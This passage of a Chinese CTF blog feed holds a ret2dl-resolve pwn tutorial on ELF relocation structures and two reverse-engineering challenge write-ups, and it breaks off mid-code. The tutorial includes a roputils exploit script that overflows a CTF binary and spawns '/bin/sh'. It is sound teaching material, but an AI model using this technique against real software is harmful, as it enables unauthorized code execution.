[18] .eh_frame         PROGBITS        08048674 000674 0000f4 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000020 04  WA  0   0  4</span><br><span class="line">  [25] .data             PROGBITS        0804a020 001020 000008 00  WA  0   0  4</span><br><span class="line">  [26] .bss              NOBITS          0804a040 001028 00000c 00  WA  0   0 32</span><br><span class="line">  [27] .comment          PROGBITS        00000000 001028 000035 01  MS  0   0  1</span><br><span class="line">  [28] .shstrtab         STRTAB          00000000 001798 00010a 00      0   0  1</span><br><span class="line">  [29] .symtab           SYMTAB          00000000 001060 0004b0 10     30  47  4</span><br><span class="line">  [30] .strtab           STRTAB          00000000 001510 000288 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure><p>几个重要的节：</p><ol><li>.rel.plt节是用于函数重定位，.rel.dyn节是用于变量重定位</li></ol><p>ida 观察如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048318 ; ELF REL Relocation Table /r_offset r_info</span><br><span class="line">LOAD:08048318                 Elf32_Rel &lt;8049FFCh,  306h&gt; ; R_386_GLOB_DAT __gmon_start__</span><br><span class="line">LOAD:08048320                 Elf32_Rel &lt;804A040h,  905h&gt; ; R_386_COPY stdin</span><br><span class="line">LOAD:08048328                 Elf32_Rel &lt;804A044h,  705h&gt; ; R_386_COPY stdout</span><br><span class="line">LOAD:08048330 ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:08048330                 Elf32_Rel &lt;804A00Ch,  107h&gt; ; R_386_JMP_SLOT setbuf</span><br><span class="line">LOAD:08048338                 Elf32_Rel &lt;804A010h,  207h&gt; ; R_386_JMP_SLOT read</span><br><span class="line">LOAD:08048340                 Elf32_Rel &lt;804A014h,  407h&gt; ; R_386_JMP_SLOT strlen</span><br><span class="line">LOAD:08048348                 Elf32_Rel &lt;804A018h,  507h&gt; ; R_386_JMP_SLOT __libc_start_main</span><br><span class="line">LOAD:08048350                 Elf32_Rel &lt;804A01Ch,  607h&gt; ; R_386_JMP_SLOT write</span><br></pre></td></tr></table></figure><ol start="2"><li>.got节保存全局变量偏移表，.got.plt节保存全局函数偏移表。.got.plt对应着Elf32_Rel结构中r_offset的值。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0804A000 _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC</span><br><span class="line">.got.plt:0804A004 dword_804A004   dd 0                    ; DATA XREF: sub_8048380↑r</span><br><span class="line">.got.plt:0804A008 dword_804A008   dd 0                    ; DATA XREF: sub_8048380+6↑r</span><br><span class="line">.got.plt:0804A00C off_804A00C     dd offset setbuf        ; DATA XREF: _setbuf↑r</span><br><span class="line">.got.plt:0804A010 off_804A010     dd offset read          ; DATA XREF: _read↑r</span><br><span class="line">.got.plt:0804A014 off_804A014     dd offset strlen        ; DATA XREF: _strlen↑r</span><br><span class="line">.got.plt:0804A018 off_804A018     dd offset __libc_start_main</span><br><span class="line">.got.plt:0804A018                                         ; DATA XREF: ___libc_start_main↑r</span><br><span class="line">.got.plt:0804A01C off_804A01C     dd offset write         ; DATA XREF: _write↑r</span><br><span class="line">.got.plt:0804A01C _got_plt        ends</span><br></pre></td></tr></table></figure><ol start="3"><li>.dynsym节包含了动态链接符号表。Elf32_Sym[num]中的num对应着ELF32_R_SYM(Elf32_Rel-&gt;r_info)。</li></ol><p>而根据定义有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ELF32_R_SYM(Elf32_Rel-&gt;r_info) = (Elf32_Rel-&gt;r_info) &gt;&gt; 8</span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">    Elf32_Word st_name;     // Symbol name(string tbl index)</span><br><span class="line">    Elf32_Addr st_value;    // Symbol value</span><br><span class="line">    Elf32_Word st_size;     // Symbol size</span><br><span class="line">    unsigned char st_info;  // Symbol type and binding</span><br><span class="line">    unsigned char st_other; // Symbol visibility under glibc&gt;=2.2</span><br><span class="line">    Elf32_Section st_shndx; // Section index</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure></p><p>read索引值为ELF32_R_SYM(0x207) = 0x207 &gt;&gt; 8 = 2。而Elf32_Sym[2]即保存着write的符号表信息。</p><p>并且ELF32_R_TYPE(0x207) = 7，对应R_386_JUMP_SLOT。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080481D8 ; ELF Symbol Table</span><br><span class="line">LOAD:080481D8                 Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:080481E8                 Elf32_Sym &lt;offset aSetbuf - offset byte_8048278, 0, 0, 12h, 0, 0&gt; ; &quot;setbuf&quot;</span><br><span class="line">LOAD:080481F8                 Elf32_Sym &lt;offset aRead - offset byte_8048278, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;</span><br><span class="line">LOAD:08048208                 Elf32_Sym &lt;offset aGmonStart - offset byte_8048278, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;</span><br><span class="line">LOAD:08048218                 Elf32_Sym &lt;offset aStrlen - offset byte_8048278, 0, 0, 12h, 0, 0&gt; ; &quot;strlen&quot;</span><br><span class="line">LOAD:08048228                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_8048278, 0, 0, 12h, 0, \ ; &quot;__libc_start_main&quot;</span><br><span class="line">LOAD:08048228                            0&gt;</span><br><span class="line">LOAD:08048238                 Elf32_Sym &lt;offset aWrite - offset byte_8048278, 0, 0, 12h, 0, 0&gt; ; &quot;write&quot;</span><br><span class="line">LOAD:08048248                 Elf32_Sym &lt;offset aStdout - offset byte_8048278, \ ; &quot;stdout&quot;</span><br><span class="line">LOAD:08048248                            offset stdout@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br><span class="line">LOAD:08048258                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_8048278, \ ; &quot;_IO_stdin_used&quot;</span><br><span class="line">LOAD:08048258                            offset _IO_stdin_used, 4, 11h, 0, 10h&gt;</span><br><span class="line">LOAD:08048268                 Elf32_Sym &lt;offset aStdin - offset byte_8048278, \ ; &quot;stdin&quot;</span><br><span class="line">LOAD:08048268                            offset stdin@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br></pre></td></tr></table></figure><ol start="4"><li>.dynstr节包含了动态链接的字符串。这个节以\x00作为开始和结尾，中间每个字符串也以\x00间隔。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048278 ; ELF String Table</span><br><span class="line">LOAD:08048278 byte_8048278    db 0                    ; DATA XREF: LOAD:080481E8↑o</span><br><span class="line">LOAD:08048278                                         ; LOAD:080481F8↑o ...</span><br><span class="line">LOAD:08048279 aLibcSo6        db &apos;libc.so.6&apos;,0</span><br><span class="line">LOAD:08048283 aIoStdinUsed    db &apos;_IO_stdin_used&apos;,0   ; DATA XREF: LOAD:08048258↑o</span><br><span class="line">LOAD:08048292 aStdin          db &apos;stdin&apos;,0            ; DATA XREF: LOAD:08048268↑o</span><br><span class="line">LOAD:08048298 aStrlen         db &apos;strlen&apos;,0           ; DATA XREF: LOAD:08048218↑o</span><br><span class="line">LOAD:0804829F aRead           db &apos;read&apos;,0             ; DATA XREF: LOAD:080481F8↑o</span><br><span class="line">LOAD:080482A4 aStdout         db &apos;stdout&apos;,0           ; DATA XREF: LOAD:08048248↑o</span><br><span class="line">LOAD:080482AB aSetbuf         db &apos;setbuf&apos;,0           ; DATA XREF: LOAD:080481E8↑o</span><br><span class="line">LOAD:080482B2 aLibcStartMain  db &apos;__libc_start_main&apos;,0</span><br><span class="line">LOAD:080482B2                                         ; DATA XREF: LOAD:08048228↑o</span><br><span class="line">LOAD:080482C4 aWrite          db &apos;write&apos;,0            ; DATA XREF: LOAD:08048238↑o</span><br><span class="line">LOAD:080482CA aGmonStart      db &apos;__gmon_start__&apos;,0   ; DATA XREF: LOAD:08048208↑o</span><br><span class="line">LOAD:080482D9 aGlibc20        db &apos;GLIBC_2.0&apos;,0</span><br></pre></td></tr></table></figure><p>Elf32_Sym[2]-&gt;st_name=0x27（.dynsym + Elf32_Sym_size * num），所以.dynstr加上0x27的偏移量，就是字符串read。</p><ol start="5"><li>.plt节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置。</li></ol><h1 id="example"><a href="#example" class="headerlink" title="example"></a>example</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v3; // eax</span><br><span class="line">  char buf[4]; // [esp+0h] [ebp-6Ch]</span><br><span class="line">  char v6; // [esp+18h] [ebp-54h]</span><br><span class="line">  int *v7; // [esp+64h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  strcpy(buf, &quot;Welcome to XDCTF2015~!\n&quot;);</span><br><span class="line">  memset(&amp;v6, 0, 0x4Cu);</span><br><span class="line">  setbuf(stdout, buf);</span><br><span class="line">  v3 = strlen(buf);</span><br><span class="line">  write(1, buf, v3);</span><br><span class="line">  vuln();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ssize_t vuln()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+Ch] [ebp-6Ch]</span><br><span class="line"></span><br><span class="line">  setbuf(stdin, &amp;buf);</span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="正常攻击"><a href="#正常攻击" class="headerlink" title="正常攻击"></a>正常攻击</h2><h2 id="roputils"><a href="#roputils" class="headerlink" title="roputils"></a>roputils</h2><p>相对而言特别方便的工具，可以自动生成需要伪造的section，并且通过函数调用直接ROP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from roputils import *</span><br><span class="line">from pwn import process</span><br><span class="line">from pwn import gdb</span><br><span class="line">from pwn import context</span><br><span class="line">r = process(&apos;./bof&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">rop = ROP(&apos;./bof&apos;)</span><br><span class="line">offset = 112</span><br><span class="line">bss_base = rop.section(&apos;.bss&apos;)</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line"></span><br><span class="line">buf += rop.call(&apos;read&apos;, 0, bss_base, 100)</span><br><span class="line">## used to call dl_Resolve()</span><br><span class="line">buf += rop.dl_resolve_call(bss_base + 20, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(&apos;/bin/sh&apos;)</span><br><span class="line">buf += rop.fill(20, buf)</span><br><span class="line">## used to make faking data, such relocation, Symbol, Str</span><br><span class="line">buf += rop.dl_resolve_data(bss_base + 20, &apos;system&apos;)</span><br><span class="line">buf += rop.fill(100, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>参考链接：<a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;相关结构&quot;&gt;&lt;a href=&quot;#相关结构&quot; class=&quot;headerlink&quot; title=&quot;相关结构&quot;&gt;&lt;/a&gt;相关结构&lt;/h1&gt;&lt;p&gt;ELF可执行文件由ELF头部，程序头部表和其对应的段，节头部表和其对应的节组成。&lt;/p&gt;
&lt;p&gt;如果一个可执行文件参与动态链
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
  </entry>
  
  <entry>
    <title>kanxueCTF-2019</title>
    <link href="http://siriuswhiter.tk/2019/03/14/kanxuectf-2019/"/>
    <id>http://siriuswhiter.tk/2019/03/14/kanxuectf-2019/</id>
    <published>2019-03-14T13:57:23.000Z</published>
    <updated>2019-03-15T10:28:23.173Z</updated>
    
    <content type="html"><![CDATA[<p><em>刚好在学逆向，突然想着可以看一下还在比赛的看雪ctf</em></p><h1 id="流浪者"><a href="#流浪者" class="headerlink" title="流浪者"></a>流浪者</h1><p>win32 gui 输入注册码，错误会有提示</p><p>od 打开，搜索字符串，找到判断结果的函数位置；</p><p>ida 打开，找到od确定的函数位置，根据ida的交叉引用，找到了判断的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">sub_401770      proc near               ; CODE XREF: sub_4017F0+83↓p</span><br><span class="line"></span><br><span class="line">BOOL __cdecl sub_4017F0(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  BOOL result; // eax</span><br><span class="line">  char Str1[28]; // [esp+D8h] [ebp-24h]</span><br><span class="line">  int v3; // [esp+F4h] [ebp-8h]</span><br><span class="line">  int v4; // [esp+F8h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v4 = 0;</span><br><span class="line">  v3 = 0;</span><br><span class="line">  while ( *(_DWORD *)(a1 + 4 * v4) &lt; 62 &amp;&amp; *(_DWORD *)(a1 + 4 * v4) &gt;= 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    Str1[v4] = aAbcdefghiabcde[*(_DWORD *)(a1 + 4 * v4)];</span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  Str1[v4] = 0;</span><br><span class="line">  if ( !strcmp(Str1, &quot;KanXueCTF2019JustForhappy&quot;) )</span><br><span class="line">    result = sub_401770();</span><br><span class="line">  else</span><br><span class="line">    result = sub_4017B0();</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aAbcdefghiabcde db &apos;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&apos;,0</span><br></pre></td></tr></table></figure><p>可以看到就是字符串对应，直接写脚本<br>中间卡了一下就是得到的是数字位置，如19，42什么的，但是输入没法这样，出去溜了个弯，回去在od strcmp之前下了个断点，查看对输入字符串的处理，之后突然意识到可能是 0-9 a-z A-Z 对应，尝试了一下，bingo</p><p>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a = &apos;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&apos;</span><br><span class="line"></span><br><span class="line">b = &apos;KanXueCTF2019JustForhappy&apos;</span><br><span class="line">array = &apos;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;</span><br><span class="line"></span><br><span class="line">c = &apos;&apos; </span><br><span class="line"></span><br><span class="line">for i in range(len(b)):</span><br><span class="line">for j in range(len(a)):</span><br><span class="line">if b[i]== a[j]:</span><br><span class="line">c += array[j]</span><br><span class="line">print c</span><br></pre></td></tr></table></figure><h1 id="Repwn"><a href="#Repwn" class="headerlink" title="Repwn"></a>Repwn</h1><p>中间卡住了。。好在后面还是把解出来了哈哈哈哈，先说下目前的思路</p><p>还是先拖进od然后搜索出现的字符串，不记得是用ida还是od找到了判断入口，下断点，同时在ida中找到函数位置，反汇编，可以看到层层嵌套的判断</p><p>第一次 判断了13位，也可以因此确定其中的13位：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">v1 = 8;</span><br><span class="line"> v2 = 0;</span><br><span class="line"> v8 = &apos;ruoY&apos;;</span><br><span class="line"> v9 = &apos;pnI_&apos;;</span><br><span class="line"> v10 = &apos;I_tu&apos;;</span><br><span class="line"> v11 = &apos;rW_s&apos;;</span><br><span class="line"> v12 = &apos;gno&apos;;</span><br><span class="line"> v4 = &apos;0Y1X&apos;;</span><br><span class="line"> v5 = &apos;t3Nu&apos;;</span><br><span class="line"> v6 = &apos;d00G&apos;;</span><br><span class="line"> v7 = 0;</span><br><span class="line"> while ( *((_BYTE *)&amp;v4 + v2) == *(_BYTE *)(v1 + key) )</span><br><span class="line"> &#123;</span><br><span class="line">   ++v2;</span><br><span class="line">   ++v1;</span><br><span class="line">   if ( v2 &gt; 11 )</span><br><span class="line">   &#123;</span><br><span class="line">     result = 1;</span><br><span class="line">     if ( *(_BYTE *)(key + 20) == &apos;H&apos; )</span><br><span class="line">       return result;</span><br><span class="line">     return 0;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> return 0;</span><br></pre></td></tr></table></figure></p><p>第二次,确定了序列长度，同时在检查第三步回来之后还会对最后四位处理，最后会将其覆盖到返回地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if ( strlen(Str) == 24 )</span><br><span class="line"> &#123;</span><br><span class="line">   if ( check3((int)Str) )</span><br><span class="line">   &#123;</span><br><span class="line">     Str[20] -= 88;</span><br><span class="line">     Str[21] -= 70;</span><br><span class="line">     Str[22] -= 3;</span><br><span class="line">     Str[23] -= 107;</span><br><span class="line">     strcpy(&amp;Dest, Str);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> else</span><br><span class="line"> &#123;</span><br><span class="line">   printf(&quot;String Length is Wrong&quot;);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>第三次，也就是最后一次，，deal_8对前八位全部减0x30， 第三次通过计算可以确定第五到八位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> deal_8(a1);</span><br><span class="line">  v1 = no_4 + 1000 * fl[0] + 100 * no_2 + 10 * no_3;</span><br><span class="line">  v2 = no_6 + 10 * no_5;</span><br><span class="line">  v3 = no_8 + 10 * no_7;</span><br><span class="line"></span><br><span class="line">  if ( 2 * (v1 + v2) != 4040 || 3 * v2 / 2 + 100 * v3 != 115 )// v1+v2 = 0x7e4</span><br><span class="line">    goto LABEL_2;</span><br><span class="line">  result = 1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  if ( v1 - 110 * v3 != 1900 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Key_Is_Wrong,Please_Input_Again!&quot;);</span><br><span class="line">LABEL_2:</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>经过不断的尝试＋猜测，终于试出了flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">20101001X1Y0uN3tG00dHaCk</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;刚好在学逆向，突然想着可以看一下还在比赛的看雪ctf&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;流浪者&quot;&gt;&lt;a href=&quot;#流浪者&quot; class=&quot;headerlink&quot; title=&quot;流浪者&quot;&gt;&lt;/a&gt;流浪者&lt;/h1&gt;&lt;p&gt;win32 gui 输入注册码，错误会有提示&lt;
      
    
    </summary>
    
      <category term="re" scheme="http://siriuswhiter.tk/categories/re/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="re" scheme="http://siriuswhiter.tk/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>bugku-reverse prac</title>
    <link href="http://siriuswhiter.tk/2019/03/13/bugku-reverse-prac/"/>
    <id>http://siriuswhiter.tk/2019/03/13/bugku-reverse-prac/</id>
    <published>2019-03-13T11:24:58.000Z</published>
    <updated>2019-03-13T11:54:57.273Z</updated>
    
    <content type="html"><![CDATA[<h1 id="love"><a href="#love" class="headerlink" title="love"></a>love</h1><p><em>其实是比较简单的逆向，但是毕竟上手时间短，写一写顺便把思路缕清</em></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开是dos窗口，等待输入flag，随便输入后直接退出</p><p>拖入IDA，重点函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">__int64 main_0()</span><br><span class="line">&#123;</span><br><span class="line">  int len; // eax</span><br><span class="line">  const char *v1; // eax</span><br><span class="line">  size_t real_len; // eax</span><br><span class="line">  int v3; // edx</span><br><span class="line">  __int64 v4; // ST08_8</span><br><span class="line">  signed int j; // [esp-B0h] [ebp-B0h]</span><br><span class="line">  signed int i; // [esp-A4h] [ebp-A4h]</span><br><span class="line">  signed int v8; // [esp-A4h] [ebp-A4h]</span><br><span class="line">  int v9; // [esp-98h] [ebp-98h]</span><br><span class="line">  int flag; // [esp-2Ch] [ebp-2Ch]</span><br><span class="line">  int v11; // [esp-10h] [ebp-10h]</span><br><span class="line">  int v12; // [esp-4h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  for ( i = 0; i &lt; 100; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (unsigned int)i &gt;= 0x64 )</span><br><span class="line">      j____report_rangecheckfailure();</span><br><span class="line">    *((_BYTE *)&amp;v12 + i - 0x94) = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  puts_(&quot;please enter the flag:&quot;);</span><br><span class="line">  scanf(&quot;%20s&quot;, &amp;flag);</span><br><span class="line">  len = j_strlen((const char *)&amp;flag);</span><br><span class="line">  v1 = (const char *)deal((int)&amp;flag, len, (int)&amp;v11);</span><br><span class="line">  strncpy((char *)&amp;v9, v1, 40u);</span><br><span class="line">  v8 = j_strlen((const char *)&amp;v9);</span><br><span class="line">  for ( j = 0; j &lt; v8; ++j )</span><br><span class="line">    *((_BYTE *)&amp;v12 + j - 0x94) += j;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  real_len = j_strlen((const char *)&amp;v9);</span><br><span class="line">  if ( !strncmp((const char *)&amp;v9, Str2, real_len) )</span><br><span class="line">    puts_(&quot;rigth flag!\n&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts_(&quot;wrong flag!\n&quot;);</span><br><span class="line">  HIDWORD(v4) = v3;</span><br><span class="line">  LODWORD(v4) = 0;</span><br><span class="line">  return v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Str2            db &apos;e3nifIH9b_C@n@dH&apos;,0</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序流程也比较清晰，初始时将一段栈内存置为0，可以看到是在v9处，之后请求输入flag，然后对输入的flag deal加密处理<br>然后处理得到的字符串再次每位加i，相当于第二次加密，之后将其与一段字符串相比，相等的话就输出right flag</p><p>所以问题的重点其实是第一次加密是怎样处理的，ida中看到一堆abcdef…，想着可能是base64，但是不确定。</p><p>将文件拖入x32dbg 先运行起来，然后搜索字符串，找到主函数的位置，根据ida可以知道在第一次加密之后调用了strncpy，所以我们在搜索到wrong flag地址，往上翻，可以大概确定加密的地址，在其之后下断点，运行程序输入任意flag，因为约定函数返回值是存在eax中的，查看此时的eax，发现其值就是输入flag的base64，接下来写脚本就完事了</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 